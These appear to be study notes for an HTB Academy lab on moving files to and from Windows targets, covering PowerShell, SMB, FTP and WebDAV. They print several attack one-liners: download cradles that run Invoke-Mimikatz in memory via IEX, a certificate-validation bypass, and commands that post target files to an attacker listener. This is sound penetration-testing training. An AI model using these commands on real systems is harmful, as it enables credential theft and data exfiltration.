# File Transfers — Windows Methods (HTB Academy)

Module: **File Transfers** · Section 2 — Windows File Transfer Methods

**Lab creds (RDP):** `htb-student` / `HTB_@cademy_stdnt!`

**QC:** Replace IPs (`192.168.x.x`), share names, and file paths with your Pwnbox/target values. Use only on authorized labs.

**Direction:**
- **Download** = get a file *onto* the Windows target (usually from your Pwnbox)
- **Upload** = send a file *off* the Windows target (usually to your Pwnbox)

---

## Why this matters

Windows ships with many tools that can move files. Attackers chain them to stay under the radar; defenders need to recognize the same patterns.

**Astaroth APT (short story):**
A phishing email dropped an LNK shortcut. That shortcut abused `WMIC` to pull JavaScript, which used `Bitsadmin` to download payloads, `Certutil` to Base64-decode them into DLLs, then `regsvr32` to load a DLL and inject the final malware into `userinit`.

**Takeaway:** “Fileless” does **not** mean nothing was transferred. It often means the payload never sat on disk as a normal `.exe` — it was decoded/run in memory using built-in Windows tools (LoLBins).

Later module sections cover more Living-Off-the-Land binaries on Windows and Linux.

---

## Download operations

### 1. PowerShell Base64 encode & decode (no network)

**What this is:** Turn a file into a long text string (Base64), copy/paste that string into the Windows shell, then rebuild the original file. No HTTP/SMB/FTP required.

**When to use:** Small files (keys, scripts, configs) when you already have a shell but network file transfer is blocked or awkward.

**How to think about it:**
1. On Pwnbox: fingerprint the file (`md5sum`), then encode it.
2. Copy the Base64 blob.
3. On Windows: decode blob → write bytes to disk.
4. Compare MD5 hashes so you know nothing got corrupted by copy/paste.

**Pwnbox — hash + encode**

```bash
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
```

| Command | What it does |
|---------|----------------|
| `md5sum id_rsa` | Prints a fingerprint of the file so you can verify later |
| `cat id_rsa \| base64 -w 0` | Reads the file and encodes it as one long Base64 line (`-w 0` = no line wraps, easier to paste) |
| `echo` | Adds a newline after the blob so your terminal looks clean |

**Windows — decode to disk**

```powershell
[IO.File]::WriteAllBytes(
  "C:\Users\Public\id_rsa",
  [Convert]::FromBase64String("<BASE64_STRING>")
)

Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

| Command | What it does |
|---------|----------------|
| `[Convert]::FromBase64String(...)` | Turns the pasted text back into raw bytes |
| `[IO.File]::WriteAllBytes("path", bytes)` | Writes those bytes to a file on disk |
| `Get-FileHash ... -Algorithm md5` | Same idea as Linux `md5sum` — confirm the file matches |

**Limits / gotchas:**
- `cmd.exe` can only handle strings up to about **8,191** characters — large files won’t paste.
- Web shells may reject huge POST/input strings.
- Fine for SSH keys/scripts; painful for big binaries/tools.

---

### 2. PowerShell web downloads (HTTP / HTTPS / FTP)

**What this is:** Use PowerShell’s built-in web client to pull a file from a URL hosted on your attack box (or the internet).

**When to use:** Most common lab/real-world option — companies usually allow outbound HTTP/HTTPS for browsing. Defenders may still block `.exe`, filter categories, or whitelist domains.

#### `Net.WebClient` building blocks

`System.Net.WebClient` is an older .NET class that can download over HTTP, HTTPS, or FTP.

| Method | What it returns / does | Simple meaning |
|--------|------------------------|----------------|
| `OpenRead` / `OpenReadAsync` | Stream | Open the remote file like a readable pipe |
| `DownloadData` / `DownloadDataAsync` | Byte array | Download raw bytes into memory |
| `DownloadFile` / `DownloadFileAsync` | Saves to disk | Classic “save this URL as a local file” |
| `DownloadString` / `DownloadStringAsync` | String | Download text (great for `.ps1` scripts) |

`*Async` versions start the download without freezing the PowerShell prompt while it runs.

#### DownloadFile — save to disk

**What this is:** Pull a remote file and write it to a path you choose.

```powershell
(New-Object Net.WebClient).DownloadFile(
  'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',
  'C:\Users\Public\Downloads\PowerView.ps1'
)

(New-Object Net.WebClient).DownloadFileAsync(
  'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1',
  'C:\Users\Public\Downloads\PowerViewAsync.ps1'
)
```

| Piece | What it does |
|-------|----------------|
| `New-Object Net.WebClient` | Creates a download helper object |
| `.DownloadFile(url, path)` | Downloads `url` and saves it as `path` |
| `.DownloadFileAsync(url, path)` | Same, but non-blocking (runs in background) |

#### DownloadString + IEX — fileless (run in memory)

**What this is:** Download a PowerShell script as text and execute it immediately without saving a `.ps1` file.

**Why attackers like it:** Less disk evidence; looks more like “PowerShell talked to the internet” than “malware.exe landed.”

```powershell
IEX (New-Object Net.WebClient).DownloadString(
  'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1'
)

# Same idea with a pipeline
(New-Object Net.WebClient).DownloadString('<URL>') | IEX
```

| Piece | What it does |
|-------|----------------|
| `.DownloadString(url)` | Fetches the script contents as a string |
| `IEX` / `Invoke-Expression` | Treats that string as PowerShell code and runs it |
| `... \| IEX` | Pipeline form — string flows into `IEX` |

#### Invoke-WebRequest (PowerShell 3.0+)

**What this is:** Newer, friendlier download cmdlet. Aliases: `iwr`, `curl`, `wget`. Often **slower** than `Net.WebClient`, but easier to read.

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

| Piece | What it does |
|-------|----------------|
| `Invoke-WebRequest <url>` | Requests the URL |
| `-OutFile PowerView.ps1` | Writes the response body to that filename |

More cradle variants (proxy-aware vs not, disk vs memory): Harmj0y’s PowerShell download cradles list.

#### Common PowerShell download errors

**A) Internet Explorer first-launch / HTML parsing error**

**What it means:** `Invoke-WebRequest` tried to use the IE engine to parse the page, but IE was never configured on the box.

```powershell
# Broken
Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

# Fixed — skip IE HTML parsing, just get raw content
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

`-UseBasicParsing` = “don’t use Internet Explorer to understand the response.”

**B) SSL/TLS certificate trust error**

**What it means:** HTTPS cert is self-signed/untrusted, so .NET refuses the connection.

```powershell
# Lab-only bypass: accept any certificate
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

IEX (New-Object Net.WebClient).DownloadString(
  'https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1'
)
```

That callback tells .NET “treat the cert as OK” so the download can proceed.

---

### 3. SMB downloads (TCP/445)

**What this is:** Host a Windows-style file share on your Linux Pwnbox, then use normal Windows `copy` / `net use` to pull files from `\\attacker\share`.

**When to use:** Internal networks where SMB is allowed between hosts. Very natural on Windows enterprise networks; often blocked outbound to the internet.

**Pwnbox — start an SMB share**

```bash
mkdir -p /tmp/smbshare
# put files you want to serve into /tmp/smbshare
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

| Piece | What it does |
|-------|----------------|
| `mkdir -p /tmp/smbshare` | Folder that becomes the share contents |
| `impacket-smbserver share` | Share name clients will use (`\\IP\share`) |
| `-smb2support` | Enables SMB2 (needed for modern Windows) |
| `/tmp/smbshare` | Local directory being shared |

**Windows — pull a file**

```cmd
copy \\192.168.220.133\share\nc.exe
```

**Meaning:** “Copy `nc.exe` from the remote share into my current directory.”

**If guest access is blocked** (common on newer Windows):

Windows refuses anonymous SMB. Add a username/password on the Impacket server, then map a drive letter.

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```cmd
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

| Command | What it does |
|---------|----------------|
| `net use n: \\IP\share /user:test test` | Maps drive `N:` to the share using credentials |
| `copy n:\nc.exe` | Copies from the mapped drive like a normal disk |

---

### 4. FTP downloads (TCP/21)

**What this is:** Run a simple FTP server on Pwnbox; Windows downloads with PowerShell or the built-in `ftp` client.

**When to use:** When HTTP/SMB aren’t ideal, or you want another protocol option. FTP is older and often monitored/blocked, but still appears in labs and legacy environments.

**Pwnbox — install and serve**

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

| Piece | What it does |
|-------|----------------|
| `pip3 install pyftpdlib` | Installs Python FTP server module |
| `python3 -m pyftpdlib --port 21` | Serves current directory over FTP on port 21 |
| (no user set) | Anonymous login allowed by default |
| (no `--port`) | Module defaults to **2121**, not 21 |

**PowerShell FTP download**

```powershell
(New-Object Net.WebClient).DownloadFile(
  'ftp://192.168.49.128/file.txt',
  'C:\Users\Public\ftp-file.txt'
)
```

**Meaning:** Same `DownloadFile` helper as HTTP, but URL starts with `ftp://`.

**Non-interactive FTP script (good for limited shells)**

**What this is:** Write FTP commands into a text file, then tell `ftp.exe` to run that file. Useful when you can’t babysit an interactive FTP prompt.

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

| Line / flag | What it does |
|-------------|--------------|
| `open IP` | Connect to the FTP server |
| `USER anonymous` | Log in anonymously |
| `binary` | Transfer raw bytes (don’t corrupt `.exe`/zips as text) |
| `GET file.txt` | Download remote `file.txt` to the local folder |
| `bye` | Quit |
| `ftp -n` | Don’t auto-login |
| `ftp -s:file` | Run commands from the script file |
| `ftp -v` | Show responses (verbose) |

---

## Upload operations

### 1. PowerShell Base64 encode → decode on Linux

**What this is:** Opposite of Base64 download. Encode a Windows file to text, paste it to your Pwnbox, decode back into a real file.

**When to use:** Small exfil (configs, hashes, short loot) when you only have clipboard/terminal paste and no upload channel.

```powershell
[Convert]::ToBase64String(
  (Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)
)

Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

| Piece | What it does |
|-------|----------------|
| `Get-Content ... -Encoding byte` | Reads the file as raw bytes |
| `[Convert]::ToBase64String(...)` | Encodes those bytes as paste-friendly text |
| `Get-FileHash ... MD5` | Fingerprint before/after transfer |

```bash
echo <BASE64> | base64 -d > hosts
md5sum hosts
```

| Command | What it does |
|---------|----------------|
| `base64 -d` | Decodes the blob back to the original file |
| `md5sum hosts` | Confirms it matches the Windows hash |

---

### 2. PowerShell web uploads

**What this is:** Windows does **not** give you a simple built-in “UploadFile to any website” story like `DownloadFile` for every case. You either:
1. Use a helper script (`PSUpload.ps1`) against a Python upload server, or
2. POST Base64 data to a listener you control.

**When to use:** Outbound HTTP is open, but you need to get loot/tools *off* the target.

#### Method A — Python `uploadserver` + `PSUpload.ps1`

**What this is:** Pwnbox runs a tiny web server with an `/upload` endpoint. Windows loads a PowerShell function and POSTs a file to it.

```bash
pip3 install uploadserver
python3 -m uploadserver
# Browser/UI upload page: http://PWNBOX:8000/upload
```

| Command | What it does |
|---------|----------------|
| `pip3 install uploadserver` | Extends Python’s HTTP server with file upload support |
| `python3 -m uploadserver` | Listens (default port **8000**) and accepts uploads |

```powershell
IEX (New-Object Net.WebClient).DownloadString(
  'https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1'
)

Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

| Piece | What it does |
|-------|----------------|
| `IEX DownloadString(...)` | Loads the upload helper script into memory |
| `Invoke-FileUpload -Uri ... -File ...` | POSTs the chosen file to the upload URL |

#### Method B — Base64 POST caught by Netcat

**What this is:** Encode the file, HTTP POST the blob to your listener, then decode on Pwnbox. No special upload server module required.

```powershell
$b64 = [System.Convert]::ToBase64String(
  (Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte)
)
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

```bash
nc -lvnp 8000
# copy the Base64 from the HTTP body
echo <base64> | base64 -d -w 0 > hosts
```

| Piece | What it does |
|-------|----------------|
| `$b64 = ...` | Stores Base64 of the file in a variable |
| `Invoke-WebRequest -Method POST -Body $b64` | Sends that text to your listener as an HTTP POST |
| `nc -lvnp 8000` | Listens on TCP 8000 and prints whatever arrives |
| `base64 -d` | Rebuilds the file from the caught blob |

---

### 3. SMB / WebDAV uploads

**What this is:** Push files from Windows to your attack host using share syntax (`\\IP\something`).

**Important catch:** Many companies **block outbound SMB (445)** so malware can’t talk SMB to the internet. If 445 is open inside the lab, normal Impacket SMB works for uploads too (`copy file \\IP\share\`).

**WebDAV workaround:** WebDAV makes an HTTP server behave like a folder share. Windows may try SMB first, then fall back to HTTP WebDAV automatically.

#### WebDAV server on Pwnbox

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

| Piece | What it does |
|-------|----------------|
| `wsgidav` | WebDAV server |
| `cheroot` | HTTP server engine WsgiDAV uses |
| `--host=0.0.0.0` | Listen on all interfaces |
| `--port=80` | HTTP port (looks like normal web traffic) |
| `--root=/tmp` | Folder clients can read/write |
| `--auth=anonymous` | No password (lab convenience) |

#### Windows — browse and upload

```cmd
dir \\192.168.49.128\DavWWWRoot
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\sharefolder\
```

| Command | What it does |
|---------|----------------|
| `dir \\IP\DavWWWRoot` | Lists the WebDAV root as if it were a network folder |
| `copy file \\IP\DavWWWRoot\` | Uploads by copying into that “share” |
| `copy file \\IP\sharefolder\` | Same, but to a real folder name on the WebDAV root |

**`DavWWWRoot` meaning:** Special Windows keyword meaning “connect to the root of this WebDAV server.” It is **not** an actual folder that must exist on the Linux side.

If outbound 445 works, you can skip WebDAV and use `impacket-smbserver` exactly like the download section — just `copy` from Windows toward `\\IP\share\`.

---

### 4. FTP uploads

**What this is:** Same FTP server as downloads, but started with write permission so the client can `PUT` / `UploadFile`.

**When to use:** You already have FTP allowed, or you’re practicing alternate channels.

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

| Flag | What it does |
|------|----------------|
| `--write` | Allows clients to upload (without this, downloads-only) |

**PowerShell upload**

```powershell
(New-Object Net.WebClient).UploadFile(
  'ftp://192.168.49.128/ftp-hosts',
  'C:\Windows\System32\drivers\etc\hosts'
)
```

**Meaning:** Read local `hosts` and store it on the FTP server as remote name `ftp-hosts`.

**FTP script upload (PUT)**

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

Same scripting idea as FTP download, but `PUT` sends a **local** file to the server instead of `GET` pulling one down.

---

## Quick cheat sheet

| Goal | Plain-English idea | Attack host | Target |
|------|--------------------|-------------|--------|
| Small file, no network | Paste file as text | `base64 -w 0` | Decode with `[IO.File]::WriteAllBytes` |
| HTTP(S) download to disk | “Save URL as file” | `python3 -m http.server` | `WebClient.DownloadFile` / `IWR -OutFile` |
| Fileless PS | Download script & run in RAM | Host the `.ps1` | `IEX (New-Object Net.WebClient).DownloadString(...)` |
| SMB transfer | Windows file share | `impacket-smbserver` (+ user/pass if needed) | `copy \\IP\share\file` / `net use` |
| FTP transfer | Old-school file server | `pyftpdlib --port 21` [`--write` for upload] | `DownloadFile` / `UploadFile` or `ftp -s:` |
| HTTP upload | POST file to your web server | `python3 -m uploadserver` | `Invoke-FileUpload` or Base64 `IWR -Method POST` |
| WebDAV upload | Make HTTP look like a share | `wsgidav --port=80 ...` | `copy \\IP\DavWWWRoot\file` |

---

## Academy questions (Section 2)

### Q1 — wget a flag from web root

**What they want:** From Pwnbox, download `flag.txt` sitting at the target’s web root, then submit the text inside.

```bash
# QC: TARGET = spawned machine IP
wget http://TARGET/flag.txt
cat flag.txt
```

| Command | What it does |
|---------|----------------|
| `wget http://TARGET/flag.txt` | Downloads the file over HTTP into the current directory |
| `cat flag.txt` | Prints the flag contents to submit |

### Q2 — upload zip, hash the payload

**What they want:** RDP in, get `upload_win.zip` onto the Windows box, extract it, run `hasher` on `upload_win.txt`, submit the hash.

```text
RDP: htb-student / HTB_@cademy_stdnt!
```

Example with SMB:

```bash
# Pwnbox — serve the zip
mkdir -p /tmp/smbshare
cp upload_win.zip /tmp/smbshare/
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```cmd
:: Windows (RDP)
net use n: \\PWNBOX_IP\share /user:test test
copy n:\upload_win.zip C:\Users\Public\
cd C:\Users\Public
tar -xf upload_win.zip
hasher upload_win.txt
```

| Step | What it does |
|------|----------------|
| Impacket share | Makes the zip available as `\\Pwnbox\share\upload_win.zip` |
| `net use` + `copy` | Authenticates and pulls the zip onto Windows |
| `tar -xf` / `Expand-Archive` | Unzips archive |
| `hasher upload_win.txt` | Lab binary that prints the hash you submit |

### Optional Exercise 1

Practice several upload/download methods over RDP until you’re comfortable, then submit: `DONE`.

---

## Recap

| Method | One-line description |
|--------|----------------------|
| Base64 paste | Move small files through the terminal with no file-transfer protocol |
| PowerShell web download | Pull files/scripts over HTTP(S)/FTP; can save to disk or run in memory |
| SMB | Classic Windows share transfer using Impacket + `copy`/`net use` |
| FTP | Simple alternate protocol with built-in Windows client or PowerShell |
| HTTP upload / PSUpload | Send files out over HTTP to a listener that accepts uploads |
| WebDAV | When outbound SMB is blocked, reuse share-style `copy` over HTTP |

More tools and LoLBin techniques appear in later sections of the module.
